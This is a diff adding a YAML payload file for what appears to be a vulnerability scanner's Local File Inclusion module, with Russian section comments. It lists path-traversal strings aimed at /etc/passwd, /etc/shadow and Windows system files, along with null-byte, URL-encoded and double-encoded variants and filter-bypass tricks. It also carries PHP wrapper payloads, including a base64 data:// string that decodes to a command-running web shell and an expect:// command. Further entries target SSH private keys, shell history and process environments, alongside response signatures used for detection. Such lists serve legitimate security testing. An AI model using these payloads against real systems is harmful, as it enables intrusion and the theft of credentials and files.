@@ -1,0 +1,85 @@
+name: Local File Inclusion (LFI)
+type: lfi
+description: "LFI test payloads — /etc/passwd traversal, Windows paths, null bytes, encoding, PHP wrappers"
+detection: "check response for file contents matching signatures"
+signatures:
+  - "root:x:"
+  - "[boot loader]"
+  - "\\[drivers\\]"
+  - "daemon:"
+  - "nobody:"
+  - "bin/bash"
+  - "bin/sh"
+  - "[extensions]"
+  - "for 16-bit app support"
+  - "WINDOWS"
+payloads:
+  # --- Linux /etc/passwd прямо ---
+  - "/etc/passwd"
+  - "/etc/shadow"
+  - "/etc/hosts"
+  - "/etc/hostname"
+  - "/proc/self/environ"
+  - "/proc/version"
+  - "/proc/cmdline"
+
+  # --- Обход с ../  (Linux) ---
+  - "../../../etc/passwd"
+  - "../../../../etc/passwd"
+  - "../../../../../etc/passwd"
+  - "../../../../../../etc/passwd"
+  - "../../../../../../../etc/passwd"
+  - "../../../../../../../../etc/passwd"
+
+  # --- Windows пути ---
+  - "C:\\Windows\\win.ini"
+  - "C:\\Windows\\System32\\drivers\\etc\\hosts"
+  - "C:\\boot.ini"
+  - "..\\..\\..\\Windows\\win.ini"
+  - "..\\..\\..\\..\\Windows\\win.ini"
+  - "..\\..\\..\\..\\..\\Windows\\win.ini"
+  - "../../../../../Windows/win.ini"
+  - "../../../../../../../../Windows/win.ini"
+
+  # --- Null-byte обход (PHP < 5.4) ---
+  - "../../../etc/passwd%00"
+  - "../../../etc/passwd%00.jpg"
+  - "../../../etc/passwd\x00"
+  - "../../../../etc/passwd%00.php"
+
+  # --- URL-encoding ---
+  - "..%2F..%2F..%2Fetc%2Fpasswd"
+  - "..%2F..%2F..%2F..%2Fetc%2Fpasswd"
+  - "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd"
+  - "%2e%2e/%2e%2e/%2e%2e/etc/passwd"
+  - "..%252f..%252f..%252fetc%252fpasswd"
+
+  # --- Double encoding ---
+  - "..%255c..%255c..%255cetc%255cpasswd"
+  - "%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd"
+
+  # --- PHP Wrappers ---
+  - "php://filter/convert.base64-encode/resource=/etc/passwd"
+  - "php://filter/read=string.rot13/resource=/etc/passwd"
+  - "php://filter/convert.iconv.utf-8.utf-16/resource=/etc/passwd"
+  - "php://input"
+  - "data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ID8+"
+  - "expect://id"
+  - "file:///etc/passwd"
+
+  # --- Обход фильтров (stripping ../) ---
+  - "....//....//....//etc/passwd"
+  - "..././..././..././etc/passwd"
+  - "....\\....\\....\\etc\\passwd"
+
+  # --- Интересные Linux-файлы ---
+  - "/etc/issue"
+  - "/etc/os-release"
+  - "/etc/apache2/apache2.conf"
+  - "/etc/nginx/nginx.conf"
+  - "/var/log/apache2/access.log"
+  - "/var/log/nginx/access.log"
+  - "/proc/self/fd/0"
+  - "/dev/fd/0"
+  - "~/.ssh/id_rsa"
+  - "~/.bash_history"
